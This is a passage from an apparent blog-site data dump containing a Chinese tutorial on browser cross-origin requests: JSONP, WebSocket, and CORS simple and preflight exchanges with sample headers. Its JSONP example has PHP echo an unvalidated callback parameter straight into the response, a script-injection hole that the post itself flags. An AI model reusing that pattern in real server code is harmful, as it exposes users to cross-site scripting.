个基本字段：Cache-Control、Content-Language、Content-Type、Expires、Last-Modified、Pragma。如果想要拿到其他字段，只能在服务器里面指定，比如 getResponseHeader('FooBar')可以返回 FooBar 字段\n\n##### 非简单请求\n\n> 非简单请求是对服务器有特殊要求的请求，比如请求方法是 put 和 delete，或者 content-type 是 application/json\n\n* 会在正式通信之前，增加一次 http 查询请求，称为预检请求\n* 浏览器先询问服务器，当前网页所在的域名是否在服务器的许可名单之中，以及可以使用哪些 HTTP 动词和头信息字段。只有得到肯定答复，浏览器才会发出正式的 XMLHttpRequest 请求，否则就报错\n* 预检请求的方法是 options，表示这个请求是询问的\n* 浏览器发出的预请求\n\n```javascript\n//浏览器\nvar url = \"http://api.alice.com/cors\";\nvar xhr = new XMLHttpRequest();\nxhr.open(\"PUT\", url, true);\nxhr.setRequestHeader(\"X-Custom-Header\", \"value\");\nxhr.send();\n//http头\nOPTIONS /cors HTTP/1.1\nOrigin: http://api.bob.com\nAccess-Control-Request-Method: PUT//（必须的）告知请求是什么方法\nAccess-Control-Request-Headers: X-Custom-Header//发送额外的头部信息，以逗号分割\nHost: api.alice.com\nAccept-Language: en-US\nConnection: keep-alive\n```\n\n* 服务器的回应,在检查 origin，method 和 headers 字段后\n\n```javascript\nHTTP/1.1 200 OK\nDate: Mon, 01 Dec 2008 01:15:39 GMT\nServer: Apache/2.0.61 (Unix)\nAccess-Control-Allow-Origin: http://api.bob.com//（关键）\nAccess-Control-Allow-Methods: GET, POST, PUT//必须，返回的是所有支持方法，而不但是浏览器请求的那个方法，这样是避免多次预检请求\nAccess-Control-Allow-Headers: X-Custom-Header//如果浏览器有，则这个字段也是必须的\nAccess-Control-Max-Age: 1728000 //本次预检请求的有效期，单位是秒，允许缓存该条回应多少秒。在此期间，不用发出另一条预检请求。\nContent-Type: text/html; charset=utf-8\nContent-Encoding: gzip\nContent-Length: 0\nKeep-Alive: timeout=2, max=100\nConnection: Keep-Alive\nContent-Type: text/plain\n```\n\n一旦服务器通过了预检请求，以后每次浏览器的请求都跟简单请求一样\n\n* 优点：CORS 的优点：CORS 支持所有类型的 HTTP 请求，是跨域 HTTP 请求的根本解决方案。\n","source":"_posts/study-domain-02.md","raw":"---\ntitle: 浅谈浏览器跨域（二）之最终方案\ndate: 2018-05-16 21:29:55\ntags: 浏览器\n---\n\n# 单向跨域（一般用来获取数据）\n\n> 上面是两个页面之间的交互，现在是单方面向外面聊天的\n\n## JSONP\n\n> JSON With Padding\n\n* 原理是 html 的 script 标签可以加载并执行其他域的 js 文件。\n* 一般 query 是 callback，当然是其他也是，只不过现在和服务端约定好了，服务队会获取到 req.query.callback 这样\n\n```javascript\n<script type=\"text/javascript\">\n    function dosomething(jsondata){\n        //处理获得的json数据\n    }\n</script>\n<script src=\"http://example.com/data.php?callback=dosomething\"></script>\n\n//服务器\n<?php\n$callback = $_GET['callback'];//得到回调函数名\n$data = array('a','b','c');//要返回的数据\necho $callback.'('.json_encode($data).')';//输出\n?>\n//服务器会返回domething(['a','b','c'])给浏览器，就可以直接执行了\n```\n\n* 优点是兼容性好，并且在请求完毕后可以通过调用 callback 的方法回传结果\n* 缺点是支持 get 请求，传输的数据长度有限制\n* 缺点是错误处理机制不完善，没办法进行错误处理\n* 更主要的缺点是安全问题，如果被不信任的服务使用的时候会很危险，比如，callback 参数恶意添加标签（如 script，造成 xss 漏洞）\n\n## websocket 协议\n\n* 是一种通信协议，使用 ws://和 wss（加密）://\n* 这个协议不实行同源策略，只要服务器支持，就可以\n\n## 通过 CORS 跨域\n\n* Cross-Origin Resource Sharing 跨域资源共享\n* 规定了浏览器应该如何与服务器如何通过，背后的思想是使用自定义的 http 头部让浏览器和服务器沟通，从而决定请求或者响应是成功还是失败\n* 浏览器不能低于 IE10\n* 对于开发者来说 CORS 通信和同源的 ajax 通信没有差别，代码完全一样。浏览器一旦发现 ajax 请求跨域，就会自动添加一些附加的头部信息，有时还会多处一次附加的请求，但是用户不会有感觉\n  > 实现 CORS 通信的关键是服务器，只要服务器实现了 CORS 接口，就可以跨源通信\n\n```javascript\n//相对路径是本源\n<script type=\"text/javascript\">\n  var xhr = new XMLHttpRequest(); xhr.open(\"POST\", \"/damonare\",true);\n  xhr.send();\n</script>\n//绝对路径，跨域，无感\n<script type=\"text/javascript\">\n    var xhr = new XMLHttpRequest();\n    xhr.open(\"￼GET\", \"http://segmentfault.com/u/trigkit4/\",true);\n    xhr.send();\n</script>\n```\n\n### 两种请求\n\n> cors 分为两类，简单请求和非简单请求\n\n##### 简单请求\n\n满足下面三个条件，就属于简单请求\n\n* 请求方法是 get，post，head\n* (Content-Type)只能是 application/x-www-form-urlencoded, multipart/form-data 或 text/plain 中的一种\n* 不会使用自定义请求头（类似于 X-Modified 这种）\n\n###### 基本流程简单\n\n* 请求的话，浏览器直接发出 CORS 请求。具体就是浏览器发现这次请求是简单请求，就主动在头信息之中，增加一个 origin 字段\n\n```javascript\n//让我们看看，在这个场景中，浏览器会发送什么的请求到服务器，而服务器又会返回什么给浏览器：\nGET /resources/public-data/ HTTP/1.1\nHost: bar.other\nUser-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1b3pre) Gecko/20081130\nMinefield/3.1b3pre\nAccept: text/html,application/xhtml+xml,application/xml;\nAccept-Language: en-us,en;q=0.5\nAccept-Encoding: gzip,deflate\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\nConnection: keep-alive\nReferer: http://foo.example/examples/access-control/simpleXSInvocation.html\nOrigin: http://foo.example //该请求来自于 http://foo.exmaple。\n//以上是浏览器发送请求\n\nHTTP/1.1 200 OK\nDate: Mon, 01 Dec 2008 00:23:53 GMT\nServer: Apache/2.0.61\nAccess-Control-Allow-Origin: * //这表明服务器接受来自任何站点的跨站请求。如果设置为http://foo.example。其它站点就不能跨站访问 http://bar.other 的资源了。\nKeep-Alive: timeout=2, max=100\nConnection: Keep-Alive\nTransfer-Encoding: chunked\nContent-Type: application/xml\n//以上是服务器返回信息给浏览器\n```\n\n###### 服务器返回的与 CORS 有关的字段\n\n> 一般都是以 Access-Control 开头\n\n* Access-Control-Allow-Origin 接受域名的请求，必须的\n* Access-Control-Allow-Credentials 可选，表示允不允许发送 cookie。如果需要发送，浏览器的 ajax 请求要打开 withCredentials 属性（xhr.withCredentials = true;）\n* Access-Control-Expose-Headers 可选。因为 cors 请求，xhr 对象的 getResponseHeader()方法只能拿到 6 个基本字段：Cache-Control、Content-Language、Content-Type、Expires、Last-Modified、Pragma。如果想要拿到其他字段，只能在服务器里面指定，比如 getResponseHeader('FooBar')可以返回 FooBar 字段\n\n##### 非简单请求\n\n> 非简单请求是对服务器有特殊要求的请求，比如请求方法是 put 和 delete，或者 content-type 是 application/json\n\n* 会在正式通信之前，增加一次 http 查询请求，称为预检请求\n* 浏览器先询问服务器，当前网页所在的域名是否在服务器的许可名单之中，以及可以使用哪些 HTTP 动词和头信息字段。只有得到肯定答复，浏览器才会发出正式的 XMLHttpRequest 请求，否则就报错\n* 预检请求的方法是 options，表示这个请求是询问的\n* 浏览器发出的预请求\n\n```javascript\n//浏览器\nvar url = \"http://api.alice.com/cors\";\nvar xhr = new XMLHttpRequest();\nxhr.open(\"PUT\", url, true);\nxhr.setRequestHeader(\"X-Custom-Header\", \"value\");\nxhr.send();\n//http头\nOPTIONS /cors HTTP/1.1\nOrigin: http://api.bob.com\nAccess-Control-Request-Method: PUT//（必须的）告知请求是什么方法\nAccess-Control-Request-Headers: X-Custom-Header//发送额外的头部信息，以逗号分割\nHost: api.alice.com\nAccept-Language: en-US\nConnection: keep-alive\n```\n\n* 服务器的回应,在检查 origin，method 和 headers 字段后\n\n```javascript\nHTTP/1.1 200 OK\nDate: Mon, 01 Dec 2008 01:15:39 GMT\nServer: Apache/2.0.61 (Unix)\nAccess-Control-Allow-Origin: http://api.bob.com//（关键）\nAccess-Control-Allow-Methods: GET, POST, PUT//必须，返回的是所有支持方法，而不但是浏览器请求的那个方法，这样是避免多次预检请求\nAccess-Control-Allow-Headers: X-Custom-Header//如果浏览器有，则这个字段也是必须的\nAccess-Control-Max-Age: 1728000 //本次预检请求的有效期，单位是秒，允许缓存该条回应多少秒。在此期间，不用发出另一条预检请求。\nContent-Type: text/html; charset=utf-8\nContent-Encoding: gzip\nContent-Length: 0\nKeep-Alive: timeout=2, max=100\nConnection: Keep-Alive\nContent-Type: text/plain\n```\n\n一旦服务器通过了预检请求，以后每次浏览器的请求都跟简单请求一样\n\n* 优点：CORS 的优点：CORS 支持所有类型的 HTTP 请求，是跨域 HTTP 请求的根本解决方案。\n","slug":"study-domain-02","published":1,"updated":"2018-05-16T13:58:34.601Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsm034qp002k0iof7kqpg1iv","content":"<h1 id=\"单向跨域（一般用来获取数据）\"><a href=\"#单向跨域（一般用来获取数据）\" class=\"headerlink\" title=\"单向跨域（一般用来获取数据）\"></a>单向跨域（一般用来获取数据）</h1><blockquote>\n<p>上面是两个页面之间的交互，现在是单方面向外面聊天的</p>\n</blockquote>\n<h2 id=\"JSONP\"><a href=\"#JSONP\" class=\"headerlink\" title=\"JSONP\"></a>JSONP</h2><blockquote>\n<p>JSON With Padding</p>\n</blockquote>\n<ul>\n<li>原理是 html 的 script 标签可以加载并执行其他域的 js 文件。</li>\n<li>一般 query 是 callback，当然是其他也是，只不过现在和服务端约定好了，服务队会获取到 req.query.callback 这样</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script type=<span class=\"string\">\"text/javascript\"</span>&gt;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">dosomething</span>(<span class=\"params\">jsondata</span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">//处理获得的json数据</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&lt;<span class=\"regexp\">/script&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">&lt;script src=\"http:/</span><span class=\"regexp\">/example.com/</span>data.php?callback=dosomething<span class=\"string\">\"&gt;&lt;/script&gt;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">//服务器</span></span><br><span class=\"line\"><span class=\"string\">&lt;?php</span></span><br><span class=\"line\"><span class=\"string\">$callback = $_GET['callback'];//得到回调函数名</span></span><br><span class=\"line\"><span class=\"string\">$data = array('a','b','c');//要返回的数据</span></span><br><span class=\"line\"><span class=\"string\">echo $callback.'('.json_encode($data).')';//输出</span></span><br><span class=\"line\"><span class=\"string\">?&gt;</span></span><br><span class=\"line\"><span class=\"string\">//服务器会返回domething(['a','b','c'])给浏览器，就可以直接执行了</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>优点是兼容性好，并且在请求完毕后可以通过调用 callback 的方法回传结果</li>\n<li>缺点是支持 get 请求，传输的数据长度有限制</li>\n<li>缺点是错误处理机制不完善，没办法进行错误处理</li>\n<li>更主要的缺点是安全问题，如果被不信任的服务使用的时候会很危险，比如，callback 参数恶意添加标签（如 script，造成 xss 漏洞）</li>\n</ul>\n<h2 id=\"websocket-协议\"><a href=\"#websocket-协议\" class=\"headerlink\" title=\"websocket 协议\"></a>websocket 协议</h2><ul>\n<li>是一种通信协议，使用 ws://和 wss（加密）://</li>\n<li>这个协议不实行同源策略，只要服务器支持，就可以</li>\n</ul>\n<h2 id=\"通过-CORS-跨域\"><a href=\"#通过-CORS-跨域\" class=\"headerlink\" title=\"通过 CORS 跨域\"></a>通过 CORS 跨域</h2><ul>\n<li>Cross-Origin Resource Sharing 跨域资源共享</li>\n<li>规定了浏览器应该如何与服务器如何通过，背后的思想是使用自定义的 http 头部让浏览器和服务器沟通，从而决定请求或者响应是成功还是失败</li>\n<li>浏览器不能低于 IE10</li>\n<li>对于开发者来说 CORS 通信和同源的 ajax 通信没有差别，代码完全一样。浏览器一旦发现 ajax 请求跨域，就会自动添加一些附加的头部信息，有时还会多处一次附加的请求，但是用户不会有感觉<blockquote>\n<p>实现 CORS 通信的关键是服务器，只要服务器实现了 CORS 接口，就可以跨源通信</p>\n</blockquote>\n</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//相对路径是本源</span></span><br><span class=\"line\">&lt;script type=<span class=\"string\">\"text/javascript\"</span>&gt;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> xhr = <span class=\"keyword\">new</span> XMLHttpRequest(); xhr.open(<span class=\"string\">\"POST\"</span>, <span class=\"string\">\"/damonare\"</span>,<span class=\"literal\">true</span>);</span><br><span class=\"line\">  xhr.send();</span><br><span class=\"line\">&lt;<span class=\"regexp\">/script&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">/</span><span class=\"regexp\">/绝对路径，跨域，无感</span></span><br><span class=\"line\"><span class=\"regexp\">&lt;script type=\"text/</span>javascript<span class=\"string\">\"&gt;</span></span><br><span class=\"line\"><span class=\"string\">    var xhr = new XMLHttpRequest();</span></span><br><span class=\"line\"><span class=\"string\">    xhr.open(\"</span>￼GET<span class=\"string\">\", \"</span>http:<span class=\"comment\">//segmentfault.com/u/trigkit4/\",true);</span></span><br><span class=\"line\">    xhr.send();</span><br><span class=\"line\">&lt;<span class=\"regexp\">/script&gt;</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"两种请求\"><a href=\"#两种请求\" class=\"headerlink\" title=\"两种请求\"></a>两种请求</h3><blockquote>\n<p>cors 分为两类，简单请求和非简单请求</p>\n</blockquote>\n<h5 id=\"简单请求\"><a href=\"#简单请求\" class=\"headerlink\" title=\"简单请求\"></a>简单请求</h5><p>满足下面三个条件，就属于简单请求</p>\n<ul>\n<li>请求方法是 get，post，head</li>\n<li>(Content-Type)只能是 application/x-www-form-urlencoded, multipart/form-data 或 text/plain 中的一种</li>\n<li>不会使用自定义请求头（类似于 X-Modified 这种）</li>\n</ul>\n<h6 id=\"基本流程简单\"><a href=\"#基本流程简单\" class=\"headerlink\" title=\"基本流程简单\"></a>基本流程简单</h6><ul>\n<li>请求的话，浏览器直接发出 CORS 请求。具体就是浏览器发现这次请求是简单请求，就主动在头信息之中，增加一个 origin 字段</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//让我们看看，在这个场景中，浏览器会发送什么的请求到服务器，而服务器又会返回什么给浏览器：</span></span><br><span class=\"line\">GET /resources/public-data/ HTTP/<span class=\"number\">1.1</span></span><br><span class=\"line\">Host: bar.other</span><br><span class=\"line\">User-Agent: Mozilla/<span class=\"number\">5.0</span> (Macintosh; U; Intel Mac OS X <span class=\"number\">10.5</span>; en-US; rv:<span class=\"number\">1.9</span><span class=\"number\">.1</span>b3pre) Gecko/<span class=\"number\">20081130</span></span><br><span class=\"line\">Minefield/<span class=\"number\">3.1</span>b3pre</span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;</span><br><span class=\"line\">Accept-Language: en-us,en;q=<span class=\"number\">0.5</span></span><br><span class=\"line\">Accept-Encoding: gzip,deflate</span><br><span class=\"line\">Accept-Charset: ISO<span class=\"number\">-8859</span><span class=\"number\">-1</span>,utf<span class=\"number\">-8</span>;q=<span class=\"number\">0.7</span>,*;q=<span class=\"number\">0.7</span></span><br><span class=\"line\">Connection: keep-alive</span><br><span class=\"line\">Referer: http:<span class=\"comment\">//foo.example/examples/access-control/simpleXSInvocation.html</span></span><br><span class=\"line\">Origin: http:<span class=\"comment\">//foo.example //该请求来自于 http://foo.exmaple。</span></span><br><span class=\"line\"><span class=\"comment\">//以上是浏览器发送请求</span></span><br><span class=\"line\"></span><br><span class=\"line\">HTTP/<span class=\"number\">1.1</span> <span class=\"number\">200</span> OK</span><br><span class=\"line\"><span class=\"built_in\">Date</span>: Mon, <span class=\"number\">01</span> Dec <span class=\"number\">2008</span> <span class=\"number\">00</span>:<span class=\"number\">23</span>:<span class=\"number\">53</span> GMT</span><br><span class=\"line\">Server: Apache/<span class=\"number\">2.0</span><span class=\"number\">.61</span></span><br><span class=\"line\">Access-Control-Allow-Origin: * <span class=\"comment\">//这表明服务器接受来自任何站点的跨站请求。如果设置为http://foo.example。其它站点就不能跨站访问 http://bar.other 的资源了。</span></span><br><span class=\"line\">Keep-Alive: timeout=<span class=\"number\">2</span>, max=<span class=\"number\">100</span></span><br><span class=\"line\">Connection: Keep-Alive</span><br><span class=\"line\">Transfer-Encoding: chunked</span><br><span class=\"line\">Content-Type: application/xml</span><br><span class=\"line\"><span class=\"comment\">//以上是服务器返回信息给浏览器</span></span><br></pre></td></tr></table></figure>\n<h6 id=\"服务器返回的与-CORS-有关的字段\"><a href=\"#服务器返回的与-CORS-有关的字段\" class=\"headerlink\" title=\"服务器返回的与 CORS 有关的字段\"></a>服务器返回的与 CORS 有关的字段</h6><blockquote>\n<p>一般都是以 Access-Control 开头</p>\n</blockquote>\n<ul>\n<li>Access-Control-Allow-Origin 接受域名的请求，必须的</li>\n<li>Access-Control-Allow-Credentials 可选，表示允不允许发送 cookie。如果需要发送，浏览器的 ajax 请求要打开 withCredentials 属性（xhr.withCredentials = true;）</li>\n<li>Access-Control-Expose-Headers 可选。因为 cors 请求，xhr 对象的 getResponseHeader()方法只能拿到 6 个基本字段：Cache-Control、Content-Language、Content-Type、Expires、Last-Modified、Pragma。如果想要拿到其他字段，只能在服务器里面指定，比如 getResponseHeader(‘FooBar’)可以返回 FooBar 字段</li>\n</ul>\n<h5 id=\"非简单请求\"><a href=\"#非简单请求\" class=\"headerlink\" title=\"非简单请求\"></a>非简单请求</h5><blockquote>\n<p>非简单请求是对服务器有特殊要求的请求，比如请求方法是 put 和 delete，或者 content-type 是 application/json</p>\n</blockquote>\n<ul>\n<li>会在正式通信之前，增加一次 http 查询请求，称为预检请求</li>\n<li>浏览器先询问服务器，当前网页所在的域名是否在服务器的许可名单之中，以及可以使用哪些 HTTP 动词和头信息字段。只有得到肯定答复，浏览器才会发出正式的 XMLHttpRequest 请求，否则就报错</li>\n<li>预检请求的方法是 options，表示这个请求是询问的</li>\n<li>浏览器发出的预请求</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//浏览器</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> url = <span class=\"string\">\"http://api.alice.com/cors\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> xhr = <span class=\"keyword\">new</span> XMLHttpRequest();</span><br><span class=\"line\">xhr.open(<span class=\"string\">\"PUT\"</span>, url, <span class=\"literal\">true</span>);</span><br><span class=\"line\">xhr.setRequestHeader(<span class=\"string\">\"X-Custom-Header\"</span>, <span class=\"string\">\"value\"</span>);</span><br><span class=\"line\">xhr.send();</span><br><span class=\"line\"><span class=\"comment\">//http头</span></span><br><span class=\"line\">OPTIONS /cors HTTP/<span class=\"number\">1.1</span></span><br><span class=\"line\">Origin: http:<span class=\"comment\">//api.bob.com</span></span><br><span class=\"line\">Access-Control-Request-Method: PUT<span class=\"comment\">//（必须的）告知请求是什么方法</span></span><br><span class=\"line\">Access-Control-Request-Headers: X-Custom-Header<span class=\"comment\">//发送额外的头部信息，以逗号分割</span></span><br><span class=\"line\">Host: api.alice.com</span><br><span class=\"line\">Accept-Language: en-US</span><br><span class=\"line\">Connection: keep-alive</span><br></pre></td></tr></table></figure>\n<ul>\n<li>服务器的回应,在检查 origin，method 和 headers 字段后</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HTTP/<span class=\"number\">1.1</span> <span class=\"number\">200</span> OK</span><br><span class=\"line\"><span class=\"built_in\">Date</span>: Mon, <span class=\"number\">01</span> Dec <span class=\"number\">2008</span> <span class=\"number\">01</span>:<span class=\"number\">15</span>:<span class=\"number\">39</span> GMT</span><br><span class=\"line\">Server: Apache/<span class=\"number\">2.0</span><span class=\"number\">.61</span> (Unix)</span><br><span class=\"line\">Access-Control-Allow-Origin: http:<span class=\"comment\">//api.bob.com//（关键）</span></span><br><span class=\"line\">Access-Control-Allow-Methods: GET, POST, PUT<span class=\"comment\">//必须，返回的是所有支持方法，而不但是浏览器请求的那个方法，这样是避免多次预检请求</span></span><br><span class=\"line\">Access-Control-Allow-Headers: X-Custom-Header<span class=\"comment\">//如果浏览器有，则这个字段也是必须的</span></span><br><span class=\"line\">Access-Control-Max-Age: <span class=\"number\">1728000</span> <span class=\"comment\">//本次预检请求的有效期，单位是秒，允许缓存该条回应多少秒。在此期间，不用发出另一条预检请求。</span></span><br><span class=\"line\">Content-Type: text/html; charset=utf<span class=\"number\">-8</span></span><br><span class=\"line\">Content-Encoding: gzip</span><br><span class=\"line\">Content-Length: <span class=\"number\">0</span></span><br><span class=\"line\">Keep-Alive: timeout=<span class=\"number\">2</span>, max=<span class=\"number\">100</span></span><br><span class=\"line\">Connection: Keep-Alive</span><br><span class=\"line\">Content-Type: text/plain</span><br></pre></td></tr></table></figure>\n<p>一旦服务器通过了预检请求，以后每次浏览器的请求都跟简单请求一样</p>\n<ul>\n<li>优点：CORS 的优点：CORS 支持所有类型的 HTTP 请求，是跨域 HTTP 请求的根本解决方案。</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"单向跨域（一般用来获取数据）\"><a href=\"#单向跨域（一般用来获取数据）\" class=\"headerlink\" title=\"单向跨域（一般用来获取数据）\"></a>单向跨域（一般用来获取数据）</h1><blockquote>\n<p>上面是两个页面之间的交互，现在是单方面向外面聊天的</p>\n</blockquote>\n<h2 id=\"JSONP\"><a href=\"#JSONP\" class=\"headerlink\" title=\"JSONP\"></a>JSONP</h2><blockquote>\n<p>JSON With Padding</p>\n</blockquote>\n<ul>\n<li>原理是 html 的 script 标签可以加载并执行其他域的 js 文件。</li>\n<li>一般 query 是 callback，当然是其他也是，只不过现在和服务端约定好了，服务队会获取到 req.query.callback 这样</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script type=<span class=\"string\">\"text/javascript\"</span>&gt;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">dosomething</span>(<span class=\"params\">jsondata</span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">//处理获得的json数据</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&lt;<span class=\"regexp\">/script&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">&lt;script src=\"http:/</span><span class=\"regexp\">/example.com/</span>data.php?callback=dosomething<span class=\"string\">\"&gt;&lt;/script&gt;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">//服务器</span></span><br><span class=\"line\"><span class=\"string\">&lt;?php</span></span><br><span class=\"line\"><span class=\"string\">$callback = $_GET['callback'];//得到回调函数名</span></span><br><span class=\"line\"><span class=\"string\">$data = array('a','b','c');//要返回的数据</span></span><br><span class=\"line\"><span class=\"string\">echo $callback.'('.json_encode($data).')';//输出</span></span><br><span class=\"line\"><span class=\"string\">?&gt;</span></span><br><span class=\"line\"><span class=\"string\">//服务器会返回domething(['a','b','c'])给浏览器，就可以直接执行了</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>优点是兼容性好，并且在请求完毕后可以通过调用 callback 的方法回传结果</li>\n<li>缺点是支持 get 请求，传输的数据长度有限制</li>\n<li>缺点是错误处理机制不完善，没办法进行错误处理</li>\n<li>更主要的缺点是安全问题，如果被不信任的服务使用的时候会很危险，比如，callback 参数恶意添加标签（如 script，造成 xss 漏洞）</li>\n</ul>\n<h2 id=\"websocket-协议\"><a href=\"#websocket-协议\" class=\"headerlink\" title=\"websocket 协议\"></a>websocket 协议</h2><ul>\n<li>是一种通信协议，使用 ws://和 wss（加密）://</li>\n<li>这个协议不实行同源策略，只要服务器支持，就可以</li>\n</ul>\n<h2 id=\"通过-CORS-跨域\"><a href=\"#通过-CORS-跨域\" class=\"headerlink\" title=\"通过 CORS 跨域\"></a>通过 CORS 跨域</h2><ul>\n<li>Cross-Origin Resource Sharing 跨域资源共享</li>\n<li>规定了浏览器应该如何与服务器如何通过，背后的思想是使用自定义的 http 头部让浏览器和服务器沟通，从而决定请求或者响应是成功还是失败</li>\n<li>浏览器不能低于 IE10</li>\n<li>对于开发者来说 CORS 通信和同源的 ajax 通信没有差别，代码完全一样。浏览器一旦发现 ajax 请求跨域，就会自动添加一些附加的头部信息，有时还会多处一次附加的请求，但是用户不会有感觉<blockquote>\n<p>实现 CORS 通信的关键是服务器，只要服务器实现了 CORS 接口，就可以跨源通信</p>\n</blockquote>\n</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//相对路径是本源</span></span><br><span class=\"line\">&lt;script type=<span class=\"string\">\"text/javascript\"</span>&gt;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> xhr = <span class=\"keyword\">new</span> XMLHttpRequest(); xhr.open(<span class=\"string\">\"POST\"</span>, <span class=\"string\">\"/damonare\"</span>,<span class=\"literal\">true</span>);</span><br><span class=\"line\">  xhr.send();</span><br><span class=\"line\">&lt;<span class=\"regexp\">/script&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">/</span><span class=\"regexp\">/绝对路径，跨域，无感</span></span><br><span class=\"line\"><span class=\"regexp\">&lt;script type=\"text/</span>javascript<span class=\"string\">\"&gt;</span></span><br><span class=\"line\"><span class=\"string\">    var xhr = new XMLHttpRequest();</span></span><br><span class=\"line\"><span class=\"string\">    xhr.open(\"</span>￼GET<span class=\"string\">\", \"</span>http:<span class=\"comment\">//segmentfault.com/u/trigkit4/\",true);</span></span><br><span class=\"line\">    xhr.send();</span><br><span class=\"line\">&lt;<span class=\"regexp\">/script&gt;</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"两种请求\"><a href=\"#两种请求\" class=\"headerlink\" title=\"两种请求\"></a>两种请求</h3><blockquote>\n<p>cors 分为两类，简单请求和非简单请求</p>\n</blockquote>\n<h5 id=\"简单请求\"><a href=\"#简单请求\" class=\"headerlink\" title=\"简单请求\"></a>简单请求</h5><p>满足下面三个条件，就属于简单请求</p>\n<ul>\n<li>请求方法是 get，post，head</li>\n<li>(Content-Type)只能是 application/x-www-form-urlencoded, multipart/form-data 或 text/plain 中的一种</li>\n<li>不会使用自定义请求头（类似于 X-Modified 这种）</li>\n</ul>\n<h6 id=\"基本流程简单\"><a href=\"#基本流程简单\" class=\"headerlink\" title=\"基本流程简单\"></a>基本流程简单</h6><ul>\n<li>请求的话，浏览器直接发出 CORS 